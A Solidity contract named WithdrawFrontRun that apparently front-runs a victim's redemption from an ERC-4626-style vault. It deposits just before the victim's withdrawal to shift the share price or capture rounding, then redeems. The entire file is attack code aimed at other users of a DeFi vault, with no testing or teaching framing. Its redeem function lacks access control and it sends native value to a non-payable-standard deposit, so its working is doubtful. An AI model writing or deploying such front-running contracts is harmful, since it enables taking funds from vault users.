
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault4626 {
    function deposit(uint256 assets, address receiver) external payable returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function convertToAssets(uint256 shares) external view returns (uint256);
}

/// @notice Vault withdraw front-running: deposit right before a victim's
///         redemption to move the share price / capture rounding, then exit.
contract WithdrawFrontRun {
    IVault4626 public vault;

    constructor(address _vault) {
        vault = IVault4626(_vault);
    }

    function frontRunDeposit(uint256 assets) external payable returns (uint256 shares) {
        shares = vault.deposit{value: assets}(assets, address(this));
    }

    function backRunRedeem(uint256 shares) external returns (uint256 assets) {
        assets = vault.redeem(shares, address(this), address(this));
    }
}
